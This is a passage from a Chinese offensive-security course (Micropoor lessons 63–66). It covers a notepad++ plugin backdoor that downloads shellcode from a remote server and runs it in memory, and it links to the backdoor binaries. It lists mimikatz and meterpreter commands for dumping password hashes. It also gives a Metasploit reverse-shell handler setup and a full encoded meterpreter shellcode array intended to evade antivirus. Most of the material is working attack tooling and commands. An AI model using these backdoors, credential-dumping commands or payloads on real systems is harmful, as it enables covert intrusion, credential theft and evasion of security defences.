Micropoor
第六十三课：高级持续渗透-第七季demo的成长
-413-
本文档使用书栈(BookStack.CN)构建
本季是《高级持续渗透-第七季demo的成长》的延续。
https://micropoor.blogspot.com/2019/01/php-demo.html
在第一季关于后门中，文章提到重新编译notepad++，来引入有目标源码后门构造。
在第六季关于后门中，文章假设在不得知notepad++的源码，来引入无目标源码沟门构造。
在第七季关于后门中，文章让demo与上几季中对比，更贴近于实战。
而在第八季，继续优化更新demo，强调后门链在高级持续渗透中的作用。
该系列仅做后门思路。
在上季中引用一个概念：“安全是一个链安全，攻击引入链攻击，后门引入链后门”，而”链”的本质是增
加对手的时间成本，金钱成本，人力成本等。
第七季的文章结尾是这样写道：
而增改后门每一个功能，则需要更改demo的功能，或者增加几个功能的集合。那么它并不是一个标准
的”链”后门。为了更好的强调“链”后门在高级持续渗透中的作用。第八季把demo打造成一个远控。以
及可结合任意第三方渗透框架。
远控4四大要素：
可执行cmd命令
可远程管理目标机文件，文件夹等
可查看目标摄像头
注册表和服务操作
等等
而以上功能需要大量的代码以及大量的特征加入到该dll里，而此时，后门不在符合实战要求。从而需
要重新构建后门。思路如下：dll不实现任何后门功能，只做“后门中间件”。而以上功能则第四方来实
现。第三方作为与后门建立连接关系。
Demo环境：
Windows2003x64
Windows7x64
Debian
notepad++7.6.1，notepad++7.5.9
第六十四课：高级持续渗透-第八季demo便是远控
-414-
本文档使用书栈(BookStack.CN)构建
vs2017
Windows2003：ip192.168.1.119
开放端口：
notepad++版本：
第六十四课：高级持续渗透-第八季demo便是远控
-415-
本文档使用书栈(BookStack.CN)构建
notepad++v7.6以下版本插件直接放入 X:\ProgramFiles(x86)\Notepad++\plugins 目录下即
可。
放置后门：
配置后门链：
第六十四课：高级持续渗透-第八季demo便是远控
-416-
本文档使用书栈(BookStack.CN)构建
配置下载服务器：
配置msf：
再次打开notepad++：
变化如下：
下载服务器：
第六十四课：高级持续渗透-第八季demo便是远控
-417-
本文档使用书栈(BookStack.CN)构建
msf服务器：
执行顺序为：
notepad++挂起dll后门
后门访问下载服务器读取shellcode
根据shellcode内容，加载内存
执行shellcode
Micropoor.rb核心代码如下：
而此时，无需在对dll的功能改变而更改目标服务器，只需更改下载服务器shellcode，以
messagebox为例：
msf生成shellcode如下：
第六十四课：高级持续渗透-第八季demo便是远控
-418-
本文档使用书栈(BookStack.CN)构建
替换下载服务器shellcode：
再次运行notepad++，弹出messagebox，而无msfpayload功能。
第六十四课：高级持续渗透-第八季demo便是远控
-419-
本文档使用书栈(BookStack.CN)构建
后者的话：
在第八季中，只需配置一次目标服务器，便完成了对目标服务器的“后门”全部配置。以减小最小化接触
目标服务器，来减少被发现。而以后得全部配置，则在下载服务器中。来调用第四方框架。并且目标服
务器只落地一次文件，未来其他功能都将会直接加载到内存。大大的增加了管理人员的对抗成本。“后
门链”的本质是增加对手的时间成本，金钱成本，人力成本等。而对于攻击者来说，下载，执行，后门
分别在不同的IP。对于对抗安全软件，仅仅需要做“落地”的exe的加解密shellcode。
附：
Micropoor.rb
大小:1830字节
修改时间:2019年1月4日,15:46:44
MD5:D5647F7EB16C72B94E0C59D87F82F8C3
SHA1:BDCFB4A9B421ACE280472B7A8580B4D9AA97FC22CRC32:ABAB591B
https://drive.google.com/open?id=1ER6Xzcw4mfc14ql4LK0vBBuqQCd23Apg
MicroNc.exe
注：强烈建议在虚拟中测试，因Micropoor已被安全软件加入特征，故报毒。
大小:93696字节
修改时间:2019年1月4日,15:50:41
MD5:42D900BE401D2A76B68B3CA34D227DD2
第六十四课：高级持续渗透-第八季demo便是远控
-420-
本文档使用书栈(BookStack.CN)构建
SHA1:B94E2D9828009D80EEDDE3E795E9CB43C3DC2ECECRC32:CA015C3E
https://drive.google.com/open?id=1ZKKPOdEcfirHb2oT1opxSKCZPSplZUSf
Micropoor
第六十四课：高级持续渗透-第八季demo便是远控
-421-
本文档使用书栈(BookStack.CN)构建
上一季下载sys.hiv,sam.hiv,security.hiv文件后，以Linux下为背景来离线提取hash，本季补
充以windows为背景离线提取hash。
mimikatz2.0二进制文件下载地址：
https://github.com/gentilkiwi/mimikatz/releases/latest
切到当下目录（注意X86,X64位）
mimikatz离线导hash命令：
1. mimikatz.exe"lsadump::sam/system:sys.hiv/sam:sam.hiv"exit
第六十五课：离线提取目标机hash补充
-422-
本文档使用书栈(BookStack.CN)构建
mimikatz在线导hash命令：
1. mimikatz.exe"logMicropoor.txt""privilege::debug""token::elevate"
"lsadump::sam""exit"
第六十五课：离线提取目标机hash补充
-423-
本文档使用书栈(BookStack.CN)构建
当然关于提取目标机的hash，msf也内置了离线提取与在线提取hash。
meterpreter下hashdump命令来提取hash（注意当前权限）
第六十五课：离线提取目标机hash补充
-424-
本文档使用书栈(BookStack.CN)构建
msf同时也内置了mimikatz，meterpreter执行loadmimikatz即可加载该插件。（这里一定要注
意，msf默认调用于payload位数相同的mimikatz）
直接执行kerberos即可。
当然有些情况下，payload位数无误，权限无误，依然无法提取目标机的密码相关。需要调用
mimikatz自定义命令：
1. mimikatz_command-fsekurlsa::searchPasswords
第六十五课：离线提取目标机hash补充
-425-
本文档使用书栈(BookStack.CN)构建
Micropoor
第六十五课：离线提取目标机hash补充
-426-
本文档使用书栈(BookStack.CN)构建
关于分离免杀，其他章节参考：
68课时payload特征，行为分离免杀思路第一季
69课时payload分离免杀思路第二季
本季针对目标环境支持aspx进行分离免杀。
靶机背景：
Windows2003
Debian
Windows2003：
第六十六课：借助aspx对payload进行分离免杀
-427-
本文档使用书栈(BookStack.CN)构建
1. msfauxiliary(server/socks4a)>useexploit/multi/handler
2. msfexploit(multi/handler)>setpayloadwindows/meterpreter/reverse_tcp_uuid
3. payload=>windows/meterpreter/reverse_tcp_uuid
4. msfexploit(multi/handler)>setlhost192.168.1.5
5. lhost=>192.168.1.5
6. msfexploit(multi/handler)>setlport53
7. lport=>53
8. msfexploit(multi/handler)>setstageencoderx86/shikata_ga_nai
9. stageencoder=>x86/shikata_ga_nai
10. msfexploit(multi/handler)>setEnableStageEncodingtrue
11. EnableStageEncoding=>true
12. msfexploit(multi/handler)>setexitonsessionfalse
13. exitonsession=>false
14. msfexploit(multi/handler)>showoptions
15.
16. Moduleoptions(exploit/multi/handler):
17.
18. NameCurrentSettingRequiredDescription
19. --------------------------------------
20.
21. Payloadoptions(windows/meterpreter/reverse_tcp_uuid):
22.
23. NameCurrentSettingRequiredDescription
24. --------------------------------------
25.
26. EXITFUNCprocessyesExittechnique(Accepted:'',seh,thread,process,none)
27. LHOST192.168.1.5yesThelistenaddress
第六十六课：借助aspx对payload进行分离免杀
-428-
本文档使用书栈(BookStack.CN)构建
28. LPORT53yesThelistenport
29.
30. Exploittarget:
31.
32. IdName
33. ------
34. 0WildcardTarget
35.
36. msfexploit(multi/handler)>exploit-j-z
1. root@John:tmp#msfvenom-ax86-pwindows/meterpreter/reverse_tcp_uuid
2. LHOST=192.168.1.5LPORT=53EnableStageEncoding=true
3. stageencoder=x86/shikata_ga_nai-ex86/shikata_ga_nai-i5-fcsharp
4. /usr/share/metasploit-framework/lib/msf/core/opt.rb:55:warning:constant
payload生成：
第六十六课：借助aspx对payload进行分离免杀
-429-
本文档使用书栈(BookStack.CN)构建
5. OpenSSL::SSL::SSLContext::METHODSisdeprecated
6. Noplatformwasselected,choosingMsf::Module::Platform::Windowsfromthe
payload
7. Found1compatibleencoders
8. Attemptingtoencodepayloadwith5iterationsofx86/shikata_ga_nai
9. x86/shikata_ga_naisucceededwithsize401(iteration=0)x86/shikata_ga_nai
succeededwithsize428(iteration=1)x86/shikata_ga_naisucceededwithsize
455(iteration=2)x86/shikata_ga_naisucceededwithsize482(iteration=3)
10. x86/shikata_ga_naisucceededwithsize509(iteration=4)x86/shikata_ga_nai
chosenwithfinalsize509
11. Payloadsize:509bytes
12. Finalsizeofcsharpfile:2610bytes
13. byte[]buf=newbyte[509]{
14. 0xd9,0xcc,0xd9,0x74,0x24,0xf4,0x5a,0xb8,0x76,0x1e,0x3d,0x54,0x2b,0xc9,0xb1,
15. 0x79,0x83,0xc2,0x04,0x31,0x42,0x15,0x03,0x42,0x15,0x94,0xeb,0x83,0x64,0x7e,
16. 0x17,0xee,0x5e,0xa8,0xce,0x7a,0x7b,0xa0,0xae,0xab,0x4a,0xf9,0x23,0x2f,0xa3,
17. 0x05,0xf2,0x58,0x2d,0xf6,0x82,0xb7,0xaf,0x3d,0x91,0x7c,0x80,0x6a,0xd8,0xba,
18. 0x3b,0x5a,0xda,0xb6,0xca,0xc8,0xeb,0x0d,0x8c,0x2a,0x94,0xc2,0x85,0x87,0xbc,
19. 0x25,0xd1,0x6e,0x64,0xfe,0xc0,0xf6,0x5e,0x9f,0x15,0x80,0x17,0x8f,0xaa,0xae,
20. 0xff,0x22,0x6b,0x6b,0x46,0x14,0x4c,0x66,0x50,0xcb,0x1f,0x29,0x00,0x27,0x4c,
21. 0x19,0x12,0x09,0x98,0x38,0x3e,0x6c,0xa2,0x22,0x60,0xbf,0x99,0xdb,0xe7,0xc5,
22. 0xa2,0x46,0x18,0xbd,0xc4,0xae,0xd7,0x82,0xe3,0xbd,0xfe,0x40,0x33,0xf6,0xd2,
23. 0x7a,0x6b,0xe1,0x2f,0xf9,0x4b,0x8b,0xc3,0x57,0x26,0xfe,0xfd,0x91,0xf7,0x93,
24. 0x4a,0xe1,0x85,0xeb,0x68,0x16,0x42,0xc9,0x6f,0xac,0xef,0x28,0x05,0x46,0x76,
25. 0x1b,0xa3,0xb9,0xe9,0xbf,0x1a,0x56,0x3e,0xdc,0x4d,0xf3,0x9f,0x1b,0x09,0x55,
26. 0x63,0x07,0xa3,0x59,0xbc,0x57,0xad,0x72,0x53,0x6b,0xff,0x49,0x10,0x47,0x21,
27. 0x81,0xb8,0x0e,0x98,0xec,0x03,0xa3,0x9f,0x90,0xa3,0x15,0xc4,0x7d,0x87,0x5c,
28. 0xcd,0xfe,0x32,0xca,0x11,0xf3,0x14,0x20,0xc8,0x92,0x36,0x88,0xe8,0xa1,0xad,
29. 0xac,0x46,0x19,0x9f,0x04,0x76,0x01,0x41,0x3d,0x3a,0x7d,0x80,0xa2,0x4e,0x24,
30. 0xcb,0x6b,0xe7,0xc9,0xc8,0xa4,0x01,0x17,0xb3,0x3a,0xd9,0x8e,0x9b,0x13,0x7b,
31. 0xbf,0x49,0xf3,0xa9,0x71,0x57,0x49,0x54,0x60,0x32,0xf4,0x4e,0xfa,0x76,0xf8,
32. 0x38,0x7c,0xb7,0x6b,0xac,0xc1,0x27,0x6b,0xae,0x80,0x10,0x85,0x98,0x61,0x42,
33. 0x1e,0x1e,0xb0,0x58,0x6b,0xff,0x92,0x68,0xa5,0x29,0x45,0x99,0x9c,0xa2,0xc0,
34. 0x29,0x53,0xc3,0x4b,0x76,0x72,0x17,0x60,0x3d,0xd8,0x11,0xce,0xc0,0xe6,0x34,
35. 0xa1,0x26,0x65,0x98,0x79,0xf6,0x58,0x92,0x41,0x04,0xa0,0xf0,0x3d,0xf1,0x44,
36. 0xb9,0x63,0x42,0x1a,0xac,0xad,0x67,0x98,0x8f,0x27,0x73,0xdd,0x54,0x61,0x65,
37. 0xd1,0x72,0xc5,0x0f,0x8a,0xd3,0x80,0x6a,0xc3,0xf6,0x44,0x2f,0x1a,0x6a,0xe6,
38. 0xfa,0x6c,0xa5,0x95,0x54,0x47,0x54,0xbf,0x66,0x78,0xfd,0x40,0x10,0x62,0xe8,
39. 0xc0,0x93,0xa8,0x80,0xb9,0x37,0x4c,0x47,0x7b,0x61,0xc1,0x44,0x13,0x17,0x7f,
40. 0xa2,0x73,0xcd,0x76,0x5f,0x2a,0x98,0x92,0x3e,0x09,0xa3,0x60,0xeb,0x41,0x1a,
41. 0xf4,0xcb,0x6f,0x96,0xc6,0x3c,0xf0,0xda,0xc6,0x1c,0x1c,0xb6,0xa0,0x64,0x67,
42. 0x7b,0xdc,0xe2,0x43,0xf1,0xee,0x3b,0x93,0xb9,0x95,0x29,0x01,0x97,0x8c,0x09,
第六十六课：借助aspx对payload进行分离免杀
-430-
本文档使用书栈(BookStack.CN)构建
43. 0x72,0xee,0x78,0x1a,0x13,0x60,0xa6,0xac,0x05,0x99,0x6c,0x28,0x81,0x29,0x5d,
44. 0x37,0x89,0x2a,0x3d,0xbf,0x0e,0xc7,0xeb,0x9f,0x44,0x1d,0xb3,0x4d,0x1a,0xbc,
45. 0xe2,0x22,0xb2,0xb3,0xa6,0x43,0x3e,0x46,0xc5,0x0d,0xba,0x87,0xd5,0x6d,0x70,
46. 0xfe,0x87,0x58,0x2c,0x4b,0x8c,0x2d,0x56,0x21,0x4a,0xbf,0x45,0x8c,0xd9,0x9e,
47. 0xa0,0xe4,0x20,0x6b,0x7f,0xfb,0xd0,0x1e,0x88,0x13,0x6e,0x11,0xe9,0xd9};
其中分离shellcode。构造如下：